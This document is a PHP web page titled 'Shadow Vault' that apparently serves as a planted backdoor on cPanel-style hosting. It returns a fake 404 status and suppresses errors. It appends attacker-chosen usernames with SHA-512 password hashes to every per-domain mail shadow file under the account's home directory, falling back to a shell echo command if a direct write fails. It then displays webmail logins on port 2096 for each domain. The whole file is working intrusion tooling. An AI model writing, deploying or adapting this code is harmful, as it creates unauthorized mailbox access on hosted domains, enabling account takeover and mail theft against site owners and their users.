<?php
error_reporting(0);
header("HTTP/1.0 404 Not Found");

$user = get_current_user();
$home = '/home/' . $user;
$etc = $home . '/etc';
$result = '';
$loginList = [];
$resultType = '';

if (!function_exists('random_bytes')) {
    function random_bytes($length) {
        $str = '';
        for ($i = 0; $i < $length; $i++) {
            $str .= chr(mt_rand(0, 255));
        }
        return $str;
    }
}

function generateShadowHash($password) {
    $salt = substr(str_replace('+', '.', base64_encode(random_bytes(12))), 0, 16);
    return crypt($password, '$6$' . $salt . '$');
}

function getShadowAging($file) {
    $lines = @file($file, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if (!empty($lines)) {
        foreach ($lines as $line) {
            if (strpos($line, ':') !== false && $line[0] !== '#') {
                $parts = explode(':', $line);
                if (count($parts) >= 4) {
                    return implode(':', array_slice($parts, 2, 7));
                }
            }
        }
    }
    return '19400:0:99999:7:::';
}

function appendToShadow($file, $entry) {
   
    if (@file_put_contents($file, $entry, FILE_APPEND | LOCK_EX) !== false) {
        return true;
    }
    
    $fp = @fopen($file, 'a');
    if ($fp) {
        if (@flock($fp, LOCK_EX)) {
            $write = @fwrite($fp, $entry);
            @flock($fp, LOCK_UN);
            @fclose($fp);
            if ($write !== false) return true;
        }
        @fclose($fp);
    }
    
    if (function_exists('exec')) {
        $escapedEntry = escapeshellarg($entry);
        // remove trailing newline if any, echo adds it
        $entryNoNewline = rtrim($entry, "\n");
        $cmd = "echo " . escapeshellarg($entryNoNewline) . " >> " . escapeshellarg($file);
        @exec($cmd, $output, $ret);
        if ($ret === 0) return true;
    }
    
    return false;
}

if (isset($_POST['submit'])) {
    $localpart = trim($_POST['username']);
    $password = trim($_POST['password']);
    
    if (!empty($localpart) && !empty($password)) {
        $hash = generateShadowHash($password);
        $shadows = glob($etc . '/*/shadow');
        
        if (empty($shadows)) {
            $result = 'No shadow files found. Check directory structure.';
            $resultType = 'error';
        } else {
            $written = false;
            foreach ($shadows as $file) {
                if (preg_match('#/etc/([^/]+)/shadow$#', $file, $match)) {
                    $domain = $match[1];
                    $aging = getShadowAging($file);
                    $shadowUsername = $localpart;
                    $shadowEntry = $shadowUsername . ':' . $hash . ':' . $aging . "\n";
                    
                    if (appendToShadow($file, $shadowEntry)) {
                        $written = true;
                        $loginList[] = [
                            'domain' => $domain,
                            'displayUsername' => $localpart . '@' . $domain,
                            'password' => $password
                        ];
                    }
                }
            }
            
            if ($written) {
                $result = 'User successfully added to shadow.';
                $resultType = 'success';
                $loginList = array_unique($loginList, SORT_REGULAR);
            } else {
                $result = 'Failed to write to shadow (all methods failed).';
                $resultType = 'error';
            }
        }
    } else {
        $result = 'Please fill in both username and password.';
        $resultType = 'warning';
    }
}
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <title>Shadow Vault | User Manager</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:opsz,wght@14..32,400;14..32,500;14..32,600;14..32,700&display=swap" rel="stylesheet">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        * { margin:0; padding:0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: radial-gradient(circle at 20% 30%, #0a0f1e, #03060c);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 1rem;
        }
        .glass-card {
            background: rgba(15, 25, 45, 0.65);
            backdrop-filter: blur(12px);
            border-radius: 2rem;
            border: 1px solid rgba(72, 187, 120, 0.25);
            box-shadow: 0 25px 45px rgba(0,0,0,0.3);
            width: 100%;
            max-width: 1400px;
            padding: 1.8rem;
        }
        h1 {
            font-size: 1.8rem;
            font-weight: 600;
            background: linear-gradient(135deg, #c0ffb0, #4ade80);
            -webkit-background-clip: text;
            background-clip: text;
            color: transparent;
            display: flex;
            align-items: center;
            gap: 0.6rem;
            flex-wrap: wrap;
        }
        .sub {
            font-size: 0.85rem;
            color: #8ca3b9;
            border-left: 2px solid #2e7d64;
            padding-left: 0.75rem;
            margin-bottom: 1.8rem;
        }
        .form-row {
            display: flex;
            flex-wrap: wrap;
            gap: 1rem;
            margin-bottom: 1.3rem;
        }
        .input-group {
            flex: 1;
            min-width: 200px;
            text-align: left;
        }
        .input-group label {
            display: block;
            font-size: 0.85rem;
            font-weight: 500;
            color: #b9d0f0;
            margin-bottom: 0.4rem;
        }
        .input-field {
            background: rgba(0,0,0,0.5);
            border: 1px solid #2a3a4a;
            border-radius: 1.2rem;
            padding: 0.75rem 1rem;
            width: 100%;
            font-size: 0.95rem;
            color: #f0f9ff;
            outline: none;
        }
        .input-field:focus {
            border-color: #4ade80;
            box-shadow: 0 0 0 2px rgba(74,222,128,0.2);
        }
        button {
            background: linear-gradient(95deg, #1c4d2d, #0f2e1d);
            border: none;
            border-radius: 2rem;
            padding: 0.8rem 1.5rem;
            font-weight: 600;
            font-size: 1rem;
            color: #e2ffe6;
            width: 100%;
            cursor: pointer;
            display: flex;
            align-items: center;
            justify-content: center;
            gap: 10px;
            border: 1px solid rgba(74,222,128,0.3);
        }
        button:hover {
            background: linear-gradient(95deg, #2b6e3f, #1a4a2a);
            transform: scale(0.98);
        }
        .message {
            margin-top: 1.5rem;
            padding: 0.9rem 1rem;
            border-radius: 1.2rem;
            font-size: 0.9rem;
            display: flex;
            align-items: center;
            gap: 10px;
        }
        .message.success { background: rgba(34,197,94,0.12); border-left: 4px solid #22c55e; color: #bef5cf; }
        .message.error { background: rgba(239,68,68,0.12); border-left: 4px solid #ef4444; color: #ffcdcd; }
        .message.warning { background: rgba(245,158,11,0.12); border-left: 4px solid #f59e0b; color: #ffecb3; }
        .result-section {
            margin-top: 2rem;
            border-top: 1px dashed #2a4b3c;
            padding-top: 1.2rem;
        }
        .result-title {
            font-weight: 600;
            margin-bottom: 1rem;
            color: #9be3af;
        }
        .table-wrapper {
            overflow-x: auto;
            border-radius: 1rem;
            background: rgba(0,0,0,0.35);
        }
        .cred-table {
            width: 100%;
            border-collapse: collapse;
            font-size: 0.85rem;
            font-family: monospace;
        }
        .cred-table th, .cred-table td {
            padding: 0.9rem 0.8rem;
            text-align: left;
            border-bottom: 1px solid #2c5a42;
        }
        .cred-table th {
            background: rgba(20,40,30,0.6);
            color: #9be3af;
        }
        .cred-table tr:hover {
            background: rgba(74,222,128,0.05);
        }
        .cred-table td {
            color: #e2ffea;
            word-break: break-all;
        }
        .copy-btn {
            background: #1a3a2a;
            border: none;
            padding: 0.2rem 0.6rem;
            border-radius: 20px;
            color: #b1f0c2;
            font-size: 0.7rem;
            cursor: pointer;
            margin-left: 8px;
        }
        .badge-ssl {
            background: #1a3a2a;
            font-size: 0.65rem;
            padding: 0.15rem 0.5rem;
            border-radius: 20px;
            margin-left: 0.5rem;
        }
        footer {
            margin-top: 1.8rem;
            font-size: 0.7rem;
            text-align: center;
            color: #4f6f7a;
        }
        @media (max-width: 640px) {
            .glass-card { padding: 1rem; }
            .cred-table th, .cred-table td { padding: 0.6rem 0.4rem; font-size: 0.75rem; }
        }
    </style>
</head>
<body>
<div class="glass-card">
    <h1><i class="fas fa-shield-alt"></i> Shadow Vault</h1>
    <div class="sub"><i class="fas fa-database"></i> Secure credential manager • SHA-512 • Dynamic aging • Multi-method write</div>

    <form method="post">
        <div class="form-row">
            <div class="input-group">
                <label><i class="fas fa-at"></i> Local part (username)</label>
                <input type="text" name="username" class="input-field" placeholder="e.g., john" required value="<?php echo isset($_POST['username']) ? htmlspecialchars($_POST['username']) : ''; ?>">
                <div style="font-size:0.7rem; color:#5c8a6e; margin-top:5px;">* Saved as plain username (no domain) in shadow</div>
            </div>
            <div class="input-group">
                <label><i class="fas fa-lock"></i> Password</label>
                <input type="password" name="password" class="input-field" placeholder="••••••••" required>
            </div>
        </div>
        <button type="submit" name="submit"><i class="fas fa-key"></i> Add to Shadow</button>
    </form>

    <?php if ($result): ?>
    <div class="message <?php echo $resultType; ?>">
        <i class="fas <?php echo $resultType=='success' ? 'fa-check-circle' : ($resultType=='error' ? 'fa-exclamation-triangle' : 'fa-info-circle'); ?>"></i>
        <?php echo htmlspecialchars($result); ?>
    </div>
    <?php endif; ?>

    <?php if (!empty($loginList)): ?>
    <div class="result-section">
        <div class="result-title"><i class="fas fa-globe"></i> Webmail Access (port 2096)</div>
        <div class="table-wrapper">
            <table class="cred-table">
                <thead><tr><th>Login (domain:2096)</th><th>Username</th><th>Password</th></tr></thead>
                <tbody>
                <?php foreach ($loginList as $item): ?>
                <tr>
                    <td><?php echo htmlspecialchars($item['domain']); ?>:2096 <span class="badge-ssl">SSL</span></td>
                    <td><?php echo htmlspecialchars($item['displayUsername']); ?></td>
                    <td style="white-space: nowrap;">
                        <?php echo htmlspecialchars($item['password']); ?>
                        <button class="copy-btn" onclick="copyToClipboard('<?php echo htmlspecialchars($item['password']); ?>')"><i class="far fa-copy"></i> copy</button>
                    </td>
                </tr>
                <?php endforeach; ?>
                </tbody>
            </table>
        </div>
        <div style="font-size:0.7rem; margin-top:10px; text-align:right;"><i class="fas fa-sync-alt"></i> Hash securely stored • Aging format auto-matched</div>
    </div>
    <?php endif; ?>
    <footer><i class="fas fa-server"></i> Home path: /home/<?php echo htmlspecialchars($user); ?>/etc/*/shadow</footer>
</div>
<script>
function copyToClipboard(text) {
    navigator.clipboard.writeText(text).then(() => alert('Password copied')).catch(() => prompt('Copy manually:', text));
}
</script>
</body>
</html>
